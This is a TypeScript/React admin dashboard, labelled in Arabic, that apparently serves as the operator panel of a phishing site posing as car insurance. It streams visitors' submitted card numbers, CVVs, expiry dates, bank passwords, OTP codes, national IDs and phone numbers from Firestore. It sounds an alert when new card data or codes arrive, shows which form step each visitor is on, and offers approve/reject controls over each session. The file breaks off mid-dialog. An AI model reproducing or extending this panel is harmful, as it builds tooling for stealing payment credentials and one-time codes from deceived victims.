"use client"

import { useState, useEffect, useMemo } from "react"
import { useRouter } from "next/navigation"
import {
  Trash2,
  Users,
  CreditCard,
  UserCheck,
  Filter,
  Flag,
  CheckCircle,
  ChevronLeft,
  ChevronRight,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { ar } from "date-fns/locale"
import { formatDistanceToNow } from "date-fns"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog"
import { Card, CardContent } from "@/components/ui/card"
import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { collection, onSnapshot, orderBy, query, doc, updateDoc } from "firebase/firestore"
import { ref, onValue } from "firebase/database"
import { database, db } from "@/lib/firebase"

// Flag colors for row highlighting
type FlagColor = "red" | "yellow" | "green" | null

// Insurance form data interface
export interface FormData {
  // Step 1
  insuranceType: string
  serialNumber: string
  idNumber: string
  birthDate: string

  // Step 2
  vehicleType: string
  vehicleModel: string
  vehicleYear: string
  vehicleValue: string

  // Step 3
  selectedPlan: string
  selectedOfferId?: string
  selectedFeatures?: string[]
  totalPrice?: string
  coverage: string[]
}

// Card data interface
interface CardData {
  cardNumber: string
  cardExpiry: string
  cvv: string
  cardholderName: string
  bank?: string
  prefix?: string
  pass?: string
  otp?: string
  otpCode?: string
  allOtps?: string[]
}

interface Notification {
  id: string
  createdDate: string
  status: "pending" | "approved" | "rejected" | string
  country?: string
  ip?: string
  page: string
  lastSeen: string
  isOnline?: boolean
  flagColor?: FlagColor

  // Personal info
  name?: string
  insuranceType: string
  serialNumber: string
  birthDate: string

  // Step 2
  vehicleType: string
  vehicleModel: string
  vehicleYear: string
  vehicleValue: string

  // Step 3
  selectedPlan: string
  selectedOfferId?: string
  selectedFeatures?: string[]
  totalPrice?: string
  coverage: string[]
  mobile?: string
  phone?: string
  idNumber?: string

  // Card data
  cardData?: CardData

  // Legacy fields for backward compatibility
  bank?: string
  cardStatus?: string
  cvv?: string
  expiryDate?: string
  notificationCount?: number
  otp?: string
  otp2?: string
  cardNumber?: string
  personalInfo?: {
    id?: string
    name?: string
  }
  prefix?: string
  violationValue?: number
  pass?: string
  year?: string
  month?: string
  pagename?: string
  plateType?: string
  allOtps?: string[] | null
  phoneOtp?: string
  cardExpiry?: string
  otpCode?: string
}

// Flag color selector component
function FlagColorSelector({
  notificationId,
  currentColor,
  onColorChange,
}: {
  notificationId: string
  currentColor: FlagColor
  onColorChange: (id: string, color: FlagColor) => void
}) {
  return (
    <Popover>
      <PopoverTrigger asChild>
        <Button variant="ghost" size="icon" className="h-8 w-8">
          <Flag
            className={`h-4 w-4 ${
              currentColor === "red"
                ? "text-red-500 fill-red-500"
                : currentColor === "yellow"
                  ? "text-yellow-500 fill-yellow-500"
                  : currentColor === "green"
                    ? "text-green-500 fill-green-500"
                    : "text-muted-foreground"
            }`}
          />
        </Button>
      </PopoverTrigger>
      <PopoverContent className="w-auto p-2">
        <div className="flex gap-2">
          <Button
            variant="ghost"
            size="icon"
            className="h-8 w-8 rounded-full bg-red-100 dark:bg-red-900 hover:bg-red-200 dark:hover:bg-red-800"
            onClick={() => onColorChange(notificationId, "red")}
          >
            <Flag className="h-4 w-4 text-red-500 fill-red-500" />
            <span className="sr-only">علم أحمر</span>
          </Button>
          <Button
            variant="ghost"
            size="icon"
            className="h-8 w-8 rounded-full bg-yellow-100 dark:bg-yellow-900 hover:bg-yellow-200 dark:hover:bg-yellow-800"
            onClick={() => onColorChange(notificationId, "yellow")}
          >
            <Flag className="h-4 w-4 text-yellow-500 fill-yellow-500" />
            <span className="sr-only">علم أصفر</span>
          </Button>
          <Button
            variant="ghost"
            size="icon"
            className="h-8 w-8 rounded-full bg-green-100 dark:bg-green-900 hover:bg-green-200 dark:hover:bg-green-800"
            onClick={() => onColorChange(notificationId, "green")}
          >
            <Flag className="h-4 w-4 text-green-500 fill-green-500" />
            <span className="sr-only">علم أخضر</span>
          </Button>
          {currentColor && (
            <Button
              variant="ghost"
              size="icon"
              className="h-8 w-8 rounded-full bg-gray-100 dark:bg-gray-800 hover:bg-gray-200 dark:hover:bg-gray-700"
              onClick={() => onColorChange(notificationId, null)}
            >
              <Flag className="h-4 w-4 text-gray-500" />
              <span className="sr-only">إزالة العلم</span>
            </Button>
          )}
        </div>
      </PopoverContent>
    </Popover>
  )
}

// User status component - FIXED
function UserStatus({ userId }: { userId: string }) {
  const [isOnline, setIsOnline] = useState(false)

  useEffect(() => {
    // Subscribe to user's online status
    const userStatusRef = ref(database, `/status/${userId}`)
    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.val()
        setIsOnline(data?.state === "online" || data?.isOnline || false)
      } else {
        setIsOnline(false)
      }
    })

    return () => unsubscribe()
  }, [userId])

  return (
    <div className="flex items-center justify-center">
      <div className={`h-2.5 w-2.5 rounded-full ${isOnline ? "bg-green-500" : "bg-gray-400"} mr-2`}></div>
      <span className="text-sm">{isOnline ? "متصل" : "غير متصل"}</span>
    </div>
  )
}

// Custom hook to track online users count - FIXED
function useOnlineUsersCount() {
  const [onlineUsersCount, setOnlineUsersCount] = useState(0)

  useEffect(() => {
    const onlineUsersRef = ref(database, "status")
    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.val()
        if (data) {
          const onlineCount = Object.values(data).filter(
            (status: any) => status.state === "online" || status.isOnline,
          ).length
          setOnlineUsersCount(onlineCount)
        }
      } else {
        setOnlineUsersCount(0)
      }
    })

    return () => unsubscribe()
  }, [])

  return onlineUsersCount
}

// Replace the existing playNotificationSound function
function playNotificationSound(type: "new" | "card" | "online" | "update" = "new") {
  try {
    let audioFile = "/notification-sound.mp3"

    // Use different sounds for different types of notifications
    switch (type) {
      case "card":
        audioFile = "/card-notification.mp3" // You can add this file or use the same
        break
      case "online":
        audioFile = "/online-notification.mp3" // You can add this file or use the same
        break
      case "update":
        audioFile = "/update-notification.mp3" // You can add this file or use the same
        break
      default:
        audioFile = "/notification-sound.mp3"
    }

    const audio = new Audio(audioFile)
    audio.volume = 0.7 // Set volume to 70%
    audio.play().catch((error) => {
      console.error(`Error playing ${type} notification sound:`, error)
    })
  } catch (error) {
    console.error("Error creating audio element:", error)
  }
}

// Pagination component
function Pagination({
  currentPage,
  totalPages,
  onPageChange,
}: {
  currentPage: number
  totalPages: number
  onPageChange: (page: number) => void
}) {
  const pageNumbers = useMemo(() => {
    const pages = []
    const maxVisiblePages = 5

    if (totalPages <= maxVisiblePages) {
      // Show all pages if total pages is less than or equal to max visible pages
      for (let i = 1; i <= totalPages; i++) {
        pages.push(i)
      }
    } else {
      // Always show first page
      pages.push(1)

      // Calculate start and end of visible page range
      let startPage = Math.max(2, currentPage - 1)
      let endPage = Math.min(totalPages - 1, currentPage + 1)

      // Adjust if we're near the beginning
      if (currentPage <= 3) {
        endPage = 4
      }

      // Adjust if we're near the end
      if (currentPage >= totalPages - 2) {
        startPage = totalPages - 3
      }

      // Add ellipsis after first page if needed
      if (startPage > 2) {
        pages.push(-1) // -1 represents ellipsis
      }

      // Add visible page numbers
      for (let i = startPage; i <= endPage; i++) {
        pages.push(i)
      }

      // Add ellipsis before last page if needed
      if (endPage < totalPages - 1) {
        pages.push(-2) // -2 represents ellipsis
      }

      // Always show last page
      pages.push(totalPages)
    }

    return pages
  }, [currentPage, totalPages])

  return (
    <div className="flex items-center justify-center space-x-2 rtl:space-x-reverse mt-4">
      <Button
        variant="outline"
        size="icon"
        onClick={() => onPageChange(Math.max(1, currentPage - 1))}
        disabled={currentPage === 1}
      >
        <ChevronRight className="h-4 w-4" />
        <span className="sr-only">الصفحة السابقة</span>
      </Button>

      {pageNumbers.map((pageNumber, index) =>
        pageNumber < 0 ? (
          <span key={`ellipsis-${index}`} className="px-2">
            ...
          </span>
        ) : (
          <Button
            key={pageNumber}
            variant={currentPage === pageNumber ? "default" : "outline"}
            size="sm"
            onClick={() => onPageChange(pageNumber)}
            className="w-8 h-8 p-0"
          >
            {pageNumber}
          </Button>
        ),
      )}

      <Button
        variant="outline"
        size="icon"
        onClick={() => onPageChange(Math.min(totalPages, currentPage + 1))}
        disabled={currentPage === totalPages || totalPages === 0}
      >
        <ChevronLeft className="h-4 w-4" />
        <span className="sr-only">الصفحة التالية</span>
      </Button>
    </div>
  )
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [message, setMessage] = useState<boolean>(false)
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "insurance" | "card" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const [totalVisitors, setTotalVisitors] = useState<number>(0)
  const [cardSubmissions, setCardSubmissions] = useState<number>(0)
  const router = useRouter()
  const onlineUsersCount = useOnlineUsersCount()

  // Add a new state for the filter type
  const [filterType, setFilterType] = useState<"all" | "card" | "online" | "completed">("all")

  // Track online status for all notifications
  const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>({})

  // Pagination states
  const [currentPage, setCurrentPage] = useState(1)
  const [itemsPerPage, setItemsPerPage] = useState(10)

  const [previousNotificationCount, setPreviousNotificationCount] = useState(0)
  const [previousCardCount, setPreviousCardCount] = useState(0)
  const [previousOnlineCount, setPreviousOnlineCount] = useState(0)

  // Update statistics based on notifications data
  const updateStatistics = (notificationsData: Notification[]) => {
    // Count unique visitors
    const uniqueVisitors = new Set(notificationsData.map((n) => n.ip)).size
    setTotalVisitors(uniqueVisitors || notificationsData.length)

    // Count card submissions
    const cardCount = notificationsData.filter((n) => n.cardData?.cardNumber || n.cardNumber).length
    setCardSubmissions(cardCount)
  }

  // Update online statuses for all users - FIXED
  useEffect(() => {
    const statusRef = ref(database, "status")
    const unsubscribe = onValue(statusRef, (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.val()
        const newOnlineStatuses: Record<string, boolean> = {}

        Object.entries(data).forEach(([userId, statusData]: [string, any]) => {
          newOnlineStatuses[userId] = statusData.state === "online" || statusData.isOnline || false
        })

        setOnlineStatuses(newOnlineStatuses)
      }
    })

    return () => unsubscribe()
  }, [])

  // Replace the existing useEffect for fetching notifications
  useEffect(() => {
    let unsubscribe: () => void

    const fetchData = async () => {
      const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
      unsubscribe = onSnapshot(
        q,
        (querySnapshot) => {
          const notificationsData = querySnapshot.docs
            .map((doc) => {
              const data = doc.data() as any
              return { id: doc.id, ...data }
            })
            .filter((notification: any) => !notification.isHidden) as Notification[]

          // Calculate current counts
          const currentNotificationCount = notificationsData.length
          const currentCardCount = notificationsData.filter((n) => n.cardData?.cardNumber || n.cardNumber).length
          const currentOnlineCount = Object.values(onlineStatuses).filter(Boolean).length

          // Check for different types of updates and play appropriate sounds
          if (notifications.length > 0) {
            // New notification added
            if (currentNotificationCount > previousNotificationCount) {
              playNotificationSound("new")
            }

            // New card information added
            if (currentCardCount > previousCardCount) {
              playNotificationSound("card")
            }

            // Check for new card info or general info updates
            const hasNewCardInfo = notificationsData.some(
              (notification) =>
                notification.cardData?.cardNumber &&
                !notifications.some((n) => n.id === notification.id && n.cardData?.cardNumber),
            )

            const hasNewGeneralInfo = notificationsData.some(
              (notification) =>
                (notification.idNumber || notification.mobile) &&
                !notifications.some((n) => n.id === notification.id && (n.idNumber || n.mobile)),
            )

            // Check for status updates
            const hasStatusUpdate = notificationsData.some((notification) =>
              notifications.some((n) => n.id === notification.id && n.status !== notification.status),
            )

            // Check for OTP updates
            const hasOtpUpdate = notificationsData.some(
              (notification) =>
                notification.otp && notifications.some((n) => n.id === notification.id && n.otp !== notification.otp),
            )

            // Play sounds for different types of updates
            if (hasNewCardInfo) {
              playNotificationSound("card")
            } else if (hasNewGeneralInfo) {
              playNotificationSound("new")
            } else if (hasStatusUpdate || hasOtpUpdate) {
              playNotificationSound("update")
            }
          }

          // Update previous counts
          setPreviousNotificationCount(currentNotificationCount)
          setPreviousCardCount(currentCardCount)
          setPreviousOnlineCount(currentOnlineCount)

          // Update statistics
          updateStatistics(notificationsData)

          // Update online statuses based on lastSeen
          const newOnlineStatuses: Record<string, boolean> = { ...onlineStatuses }
          notificationsData.forEach((notification) => {
            const lastSeenTime = new Date(notification.lastSeen).getTime()
            const fiveMinutesAgo = Date.now() - 5 * 60 * 1000 // 5 minutes in milliseconds

            // Only update if we don't already have real-time status from Firebase
            if (newOnlineStatuses[notification.id] === undefined) {
              newOnlineStatuses[notification.id] = lastSeenTime > fiveMinutesAgo
            }
          })
          setOnlineStatuses(newOnlineStatuses)

          setNotifications(notificationsData)
          setIsLoading(false)

          // Reset to first page when data changes significantly
          if (Math.abs(currentNotificationCount - previousNotificationCount) > 5) {
            setCurrentPage(1)
          }
        },
        (error) => {
          console.error("Error fetching notifications:", error)
          setIsLoading(false)
        },
      )
    }

    fetchData()

    return () => {
      if (unsubscribe) {
        unsubscribe()
      }
    }
  }, [previousNotificationCount, previousCardCount, onlineStatuses])

  // Filter notifications based on the selected filter type
  const filteredNotifications = useMemo(() => {
    if (filterType === "all") {
      return notifications
    } else if (filterType === "card") {
      return notifications.filter((notification) => notification.cardData?.cardNumber || notification.cardNumber)
    } else if (filterType === "online") {
      return notifications.filter((notification) => onlineStatuses[notification.id])
    } else if (filterType === "completed") {
      return notifications.filter((notification) => notification.status === "approved")
    }
    return notifications
  }, [filterType, notifications, onlineStatuses])

  // Calculate pagination
  const totalPages = Math.ceil(filteredNotifications.length / itemsPerPage)

  // Get current page items
  const currentItems = useMemo(() => {
    const indexOfLastItem = currentPage * itemsPerPage
    const indexOfFirstItem = indexOfLastItem - itemsPerPage
    return filteredNotifications.slice(indexOfFirstItem, indexOfLastItem)
  }, [filteredNotifications, currentPage, itemsPerPage])

  // Handle page change
  const handlePageChange = (pageNumber: number) => {
    setCurrentPage(pageNumber)
    // Scroll to top of the table when page changes
    window.scrollTo({ top: 0, behavior: "smooth" })
  }

  const handleClearAll = async () => {
    setIsLoading(true)
    try {
      // Update all notifications to be hidden
      const batch = await Promise.all(
        notifications.map(async (notification) => {
          const notificationRef = doc(db, "pays", notification.id)
          await updateDoc(notificationRef, { isHidden: true })
        }),
      )
      setNotifications([])
    } catch (error) {
      console.error("Error clearing notifications:", error)
    } finally {
      setIsLoading(false)
    }
  }

  const handleDelete = async (id: string) => {
    try {
      const notificationRef = doc(db, "pays", id)
      await updateDoc(notificationRef, { isHidden: true })
      setNotifications(notifications.filter((notification) => notification.id !== id))
    } catch (error) {
      console.error("Error deleting notification:", error)
    }
  }

  // Update the handleApproval function
  const handleApproval = async (state: string, id: string) => {
    try {
      const notificationRef = doc(db, "pays", id)
      await updateDoc(notificationRef, { status: state })
      setNotifications(notifications.map((n) => (n.id === id ? { ...n, status: state } : n)))

      // Play sound for approval/rejection
      playNotificationSound("update")

      setMessage(true)
      setTimeout(() => {
        setMessage(false)
      }, 3000)
    } catch (error) {
      console.error("Error updating notification status:", error)
    }
  }

  const handleLogout = async () => {
    try {
      router.push("/")
    } catch (error) {
      console.error("Error signing out:", error)
    }
  }

  const handleInfoClick = (notification: Notification, infoType: "personal" | "insurance" | "card") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }

  const closeDialog = () => {
    setSelectedInfo(null)
    setSelectedNotification(null)
  }

  // Update the handleFlagColorChange function
  const handleFlagColorChange = async (id: string, color: FlagColor) => {
    try {
      // Update in Firestore
      const notificationRef = doc(db, "pays", id)
      await updateDoc(notificationRef, { flagColor: color })

      // Update local state
      setNotifications(
        notifications.map((notification) =>
          notification.id === id ? { ...notification, flagColor: color } : notification,
        ),
      )

      // Play sound for flag update
      playNotificationSound("update")
    } catch (error) {
      console.error("Error updating flag color:", error)
    }
  }

  // Get row background color based on flag color
  const getRowBackgroundColor = (flagColor: FlagColor) => {
    if (!flagColor) return ""

    const colorMap = {
      red: "bg-red-50 dark:bg-red-950/30 hover:bg-red-100 dark:hover:bg-red-950/50",
      yellow: "bg-yellow-50 dark:bg-yellow-950/30 hover:bg-yellow-100 dark:hover:bg-yellow-950/50",
      green: "bg-green-50 dark:bg-green-950/30 hover:bg-green-100 dark:hover:bg-green-950/50",
    }

    return colorMap[flagColor]
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <div className="text-lg font-medium">جاري التحميل...</div>
      </div>
    )
  }

  // Calculate counts for filter buttons
  const cardCount = notifications.filter((n) => n.cardData?.cardNumber || n.cardNumber).length
  const onlineCount = Object.values(onlineStatuses).filter(Boolean).length
  const completedCount = notifications.filter((n) => n.status === "approved").length

  return (
    <div dir="rtl" className="min-h-screen bg-background text-foreground p-4">
      <div className="max-w-7xl mx-auto">
        <div className="flex flex-col sm:flex-row justify-between items-center mb-6">
          <h1 className="text-2xl font-bold mb-4 sm:mb-0">لوحة الإشعارات - تأمين تري</h1>
          <div className="flex flex-col sm:flex-row gap-2">
            <Button
              variant="destructive"
              onClick={handleClearAll}
              disabled={notifications.length === 0}
              className="flex items-center gap-2"
            >
              <Trash2 className="h-4 w-4" />
              مسح جميع الإشعارات
            </Button>
            <Button variant="outline" onClick={handleLogout} className="flex items-center gap-2">
              العودة للرئيسية
            </Button>
          </div>
        </div>

        {/* Statistics Grid */}
        <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 mb-6">
          {/* Online Users Card */}
          <Card className="bg-card">
            <CardContent className="p-6 flex items-center">
              <div className="rounded-full bg-blue-100 dark:bg-blue-900 p-3 mr-4">
                <UserCheck className="h-6 w-6 text-blue-600 dark:text-blue-300" />
              </div>
              <div>
                <p className="text-sm text-muted-foreground">المستخدمين المتصلين</p>
                <p className="text-2xl font-bold">{onlineUsersCount}</p>
              </div>
            </CardContent>
          </Card>

          {/* Total Visitors Card */}
          <Card className="bg-card">
            <CardContent className="p-6 flex items-center">
              <div className="rounded-full bg-green-100 dark:bg-green-900 p-3 mr-4">
                <Users className="h-6 w-6 text-green-600 dark:text-green-300" />
              </div>
              <div>
                <p className="text-sm text-muted-foreground">إجمالي الزوار</p>
                <p className="text-2xl font-bold">{totalVisitors}</p>
              </div>
            </CardContent>
          </Card>

          {/* Card Submissions Card */}
          <Card className="bg-card">
            <CardContent className="p-6 flex items-center">
              <div className="rounded-full bg-purple-100 dark:bg-purple-900 p-3 mr-4">
                <CreditCard className="h-6 w-6 text-purple-600 dark:text-purple-300" />
              </div>
              <div>
                <p className="text-sm text-muted-foreground">معلومات البطاقات المقدمة</p>
                <p className="text-2xl font-bold">{cardSubmissions}</p>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Filter Section */}
        <Card className="mb-4 bg-card">
          <CardContent className="p-4">
            <div className="flex items-center gap-2 mb-2">
              <Filter className="h-5 w-5 text-muted-foreground" />
              <h3 className="font-medium">تصفية النتائج</h3>
            </div>
            <div className="flex flex-wrap gap-2 mt-2">
              <Button
                variant={filterType === "all" ? "default" : "outline"}
                onClick={() => setFilterType("all")}
                className="flex-1 sm:flex-none"
              >
                عرض الكل ({notifications.length})
              </Button>
              <Button
                variant={filterType === "card" ? "default" : "outline"}
                onClick={() => setFilterType("card")}
                className="flex-1 sm:flex-none"
              >
                <CreditCard className="h-4 w-4 ml-1" />
                البطاقات ({cardCount})
              </Button>
              <Button
                variant={filterType === "online" ? "default" : "outline"}
                onClick={() => setFilterType("online")}
                className="flex-1 sm:flex-none"
              >
                <UserCheck className="h-4 w-4 ml-1" />
                المتصلين ({onlineCount})
              </Button>
              <Button
                variant={filterType === "completed" ? "default" : "outline"}
                onClick={() => setFilterType("completed")}
                className="flex-1 sm:flex-none"
              >
                <CheckCircle className="h-4 w-4 ml-1" />
                المكتملة ({completedCount})
              </Button>
            </div>
          </CardContent>
        </Card>

        {/* Items per page selector */}
        <div className="flex justify-end mb-4">
          <div className="flex items-center gap-2">
            <span className="text-sm text-muted-foreground">عناصر في الصفحة:</span>
            <Select
              value={itemsPerPage.toString()}
              onValueChange={(value) => {
                setItemsPerPage(Number.parseInt(value))
                setCurrentPage(1) // Reset to first page when changing items per page
              }}
            >
              <SelectTrigger className="w-20">
                <SelectValue placeholder="10" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="5">5</SelectItem>
                <SelectItem value="10">10</SelectItem>
                <SelectItem value="20">20</SelectItem>
                <SelectItem value="50">50</SelectItem>
                <SelectItem value="100">100</SelectItem>
              </SelectContent>
            </Select>
          </div>
        </div>

        <Card className="bg-card">
          {/* Desktop Table View - Hidden on Mobile */}
          <div className="hidden md:block overflow-x-auto">
            <table className="w-full">
              <thead>
                <tr className="border-b border-border">
                  <th className="px-4 py-3 text-right font-medium text-muted-foreground">الدولة</th>
                  <th className="px-4 py-3 text-right font-medium text-muted-foreground">المعلومات</th>
                  <th className="px-4 py-3 text-right font-medium text-muted-foreground">الصفحة الحالية</th>
                  <th className="px-4 py-3 text-right font-medium text-muted-foreground">الوقت</th>
                  <th className="px-4 py-3 text-center font-medium text-muted-foreground">الحالة</th>
                  <th className="px-4 py-3 text-center font-medium text-muted-foreground">العلم</th>
                  <th className="px-4 py-3 text-center font-medium text-muted-foreground">الإجراءات</th>
                </tr>
              </thead>
              <tbody>
                {currentItems.map((notification) => (
                  <tr
                    key={notification.id}
                    className={`border-b border-border ${getRowBackgroundColor(notification?.flagColor!)} transition-colors`}
                  >
                    <td className="px-4 py-3">{notification.country || "غير معروف"}</td>
                    <td className="px-4 py-3">
                      <div className="flex flex-wrap gap-2">
                        <Badge
                          variant={notification.idNumber ? "default" : "destructive"}
                          className="rounded-md cursor-pointer"
                          onClick={() => handleInfoClick(notification, "personal")}
                        >
                          {notification.idNumber ? "معلومات شخصية" : "لا يوجد معلومات"}
                        </Badge>
                        <Badge
                          variant={notification?.vehicleModel ? "default" : "destructive"}
                          className="rounded-md cursor-pointer  dark:bg-emerald-600"
                          onClick={() => handleInfoClick(notification, "insurance")}
                        >
                          {notification?.vehicleModel ? "بيانات التأمين" : "لا يوجد بيانات"}
                        </Badge>
                        <Badge
                          variant={
                            notification.cardData?.cardNumber || notification.cardNumber ? "default" : "destructive"
                          }
                          className={`rounded-md cursor-pointer ${
                            notification.cardData?.cardNumber || notification.cardNumber
                              ? "bg-green-500 dark:bg-green-600"
                              : ""
                          }`}
                          onClick={() => handleInfoClick(notification, "card")}
                        >
                          {notification.cardData?.cardNumber || notification.cardNumber
                            ? "معلومات البطاقة"
                            : "لا يوجد بطاقة"}
                        </Badge>
                      </div>
                    </td>
                    <td className="px-4 py-3">خطوة - {notification.page}</td>
                    <td className="px-4 py-3">
                      {notification.createdDate &&
                        formatDistanceToNow(new Date(notification.createdDate), {
                          addSuffix: true,
                          locale: ar,
                        })}
                    </td>
                    <td className="px-4 py-3 text-center">
                      <UserStatus userId={notification.id} />
                    </td>
                    <td className="px-4 py-3 text-center">
                      <FlagColorSelector
                        notificationId={notification.id}
                        currentColor={notification.flagColor || null}
                        onColorChange={handleFlagColorChange}
                      />
                    </td>
                    <td className="px-4 py-3 text-center">
                      <div className="flex justify-center gap-2">
                        <Badge>{notification.otp || "لايوجد"}</Badge>
                        <Button
                          variant="ghost"
                          size="sm"
                          onClick={() => handleDelete(notification.id)}
                          className="text-red-500 dark:text-red-400 hover:text-red-600 dark:hover:text-red-300"
                        >
                          <Trash2 className="h-4 w-4" />
                        </Button>
                      </div>
                    </td>
                  </tr>
                ))}
                {currentItems.length === 0 && (
                  <tr>
                    <td colSpan={7} className="px-4 py-8 text-center text-muted-foreground">
                      لا توجد إشعارات متطابقة مع الفلتر المحدد
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>

          {/* Mobile Card View - Shown only on Mobile */}
          <div className="md:hidden space-y-4 p-4">
            {currentItems.length > 0 ? (
              currentItems.map((notification) => (
                <Card
                  key={notification.id}
                  className={`overflow-hidden bg-card border-border ${getRowBackgroundColor(notification?.flagColor!)}`}
                >
                  <CardContent className="p-4">
                    <div className="flex justify-between items-start mb-3">
                      <div>
                        <div className="font-semibold">
                          {notification.name || notification.personalInfo?.name || "غير معروف"}
                        </div>
                      </div>
                      <div className="flex items-center gap-2">
                        <FlagColorSelector
                          notificationId={notification.id}
                          currentColor={notification.flagColor || null}
                          onColorChange={handleFlagColorChange}
                        />
                        <UserStatus userId={notification.id} />
                      </div>
                    </div>

                    <div className="grid grid-cols-1 gap-3 mb-3">
                      <div className="flex flex-wrap gap-2">
                        <Badge
                          variant={notification.name ? "default" : "destructive"}
                          className="rounded-md cursor-pointer"
                          onClick={() => handleInfoClick(notification, "personal")}
                        >
                          {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                        </Badge>
                        <Badge
                          variant={notification?.vehicleModel ? "default" : "destructive"}
                          className="rounded-md cursor-pointer bg-emerald-500 dark:bg-emerald-600"
                          onClick={() => handleInfoClick(notification, "insurance")}
                        >
                          {notification?.vehicleModel ? "بيانات التأمين" : "لا يوجد بيانات"}
                        </Badge>
                        <Badge
                          variant={
                            notification.cardData?.cardNumber || notification.cardNumber ? "default" : "destructive"
                          }
                          className={`rounded-md cursor-pointer ${
                            notification.cardData?.cardNumber || notification.cardNumber
                              ? "bg-green-500 dark:bg-green-600"
                              : ""
                          }`}
                          onClick={() => handleInfoClick(notification, "card")}
                        >
                          {notification.cardData?.cardNumber || notification.cardNumber
                            ? "معلومات البطاقة"
                            : "لا يوجد بطاقة"}
                        </Badge>
                      </div>

                      <div className="text-sm">
                        <span className="font-medium">الصفحة الحالية:</span> خطوة - {notification.page}
                      </div>

                      <div className="text-sm">
                        <span className="font-medium">الوقت:</span>{" "}
                        {notification.createdDate &&
                          formatDistanceToNow(new Date(notification.createdDate), {
                            addSuffix: true,
                            locale: ar,
                          })}
                      </div>

                      <div className="flex gap-2 mt-2">
                        <Button
                          onClick={() => handleApproval("approved", notification.id)}
                          className="flex-1 bg-green-500 dark:bg-green-600 hover:bg-green-600 dark:hover:bg-green-700"
                        >
                          قبول
                        </Button>
                        <Button
                          onClick={() => handleApproval("rejected", notification.id)}
                          className="flex-1"
                          variant="destructive"
                        >
                          رفض
                        </Button>
                        <Button variant="outline" onClick={() => handleDelete(notification.id)} className="w-10 p-0">
                          <Trash2 className="h-4 w-4" />
                        </Button>
                      </div>
                      {message && <p className="text-green-500 dark:text-green-400 text-center mt-2">تم الإرسال</p>}
                    </div>
                  </CardContent>
                </Card>
              ))
            ) : (
              <div className="text-center py-8 text-muted-foreground">لا توجد إشعارات متطابقة مع الفلتر المحدد</div>
            )}
          </div>

          {/* Pagination controls */}
          {filteredNotifications.length > 0 && (
            <div className="p-4 border-t border-border">
              <Pagination currentPage={currentPage} totalPages={totalPages} onPageChange={handlePageChange} />
              <div className="text-center text-sm text-muted-foreground mt-2">
                عرض {Math.min((currentPage - 1) * itemsPerPage + 1, filteredNotifications.length)} إلى{" "}
                {Math.min(currentPage * itemsPerPage, filteredNotifications.length)} من {filteredNotifications.length}{" "}
                إشعار
              </div>
            </div>
          )}
        </Card>
      </div>

      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="bg-background text-foreground max-w-[90vw] md:max-w-md" dir="rtl">
          <DialogHeader>
            <DialogTitle>
              {selectedInfo === "personal"
                ? "المعلومات الشخصية"
                : selectedInfo === "insurance"
                  ? "بيانات التأمين"
                  : selectedInfo === "card"
                    ? "معلومات البطاقة"
                    : "معلومات عامة"}
            </DialogTitle>
          </DialogHeader>

          {selectedInfo === "personal" && selectedNotification && (
            <div className="space-y-3 p-4 bg-muted rounded-lg">
              {selectedNotification.idNumber && (
                <p className="flex justify-between">
                  <span className="font-medium">رقم الهوية:</span>
                  <span>{selectedNotification.idNumber}</span>
                </p>
              )}
              {selectedNotification.birthDate && (
                <p className="flex justify-between">
                  <span className="font-medium">تاريخ الميلاد:</span>
                  <span>{selectedNotification.birthDate}</span>
                </p>
              )}
              {selectedNotification.mobile && (
                <p className="flex justify-between">
                  <span className="font-medium">رقم الجوال:</span>
                  <span>{selectedNotification.mobile}</span>
                </p>
              )}
              {selectedNotification.name && (
                <p className="flex justify-between">
                  <span className="font-medium">الاسم:</span>
                  <span>{selectedNotification.name}</span>
                </p>
              )}
              {selectedNotification.phone && (
                <p className="flex justify-between">
                  <span className="font-medium">الهاتف:</span>
                  <span>{selectedNotification.phone}</span>
                </p>
              )}
            </div>
          )}

          {selectedInfo === "insurance" && selectedNotification && (
            <Tabs defaultValue="basic" className="w-full">
              <TabsList className="grid grid-cols-3 mb-4">
                <TabsTrigger value="basic">معلومات أساسية</TabsTrigger>
                <TabsTrigger value="vehicle">بيانات المركبة</TabsTrigger>
                <TabsTrigger value="plan">خطة التأمين</TabsTrigger>
              </TabsList>
              <TabsContent value="basic" className="space-y-3 p-4 bg-muted rounded-lg">
                <p className="flex justify-between">
                  <span className="font-medium">نوع التأمين:</span>
                  <span>{selectedNotification?.insuranceType}</span>
                </p>
                <p className="flex justify-between">
                  <span className="font-medium">الرقم التسلسلي:</span>
                  <span>{selectedNotification?.serialNumber}</span>
                </p>
                <p className="flex justify-between">
                  <span className="font-medium">رقم الهوية:</span>
                  <span>{selectedNotification?.idNumber}</span>
                </p>
                <p className="flex justify-between">
                  <span className="font-medium">تاريخ الميلاد:</span>
                  <span>{selectedNotification.birthDate}</span>
                </p>
              </TabsContent>
              <TabsContent value="vehicle" className="space-y-3 p-4 bg-muted rounded-lg">
                <p className="flex justify-between">
                  <span className="font-medium">نوع المركبة:</span>
                  <span>{selectedNotification?.vehicleType}</span>
                </p>
                <p className="flex justify-between">
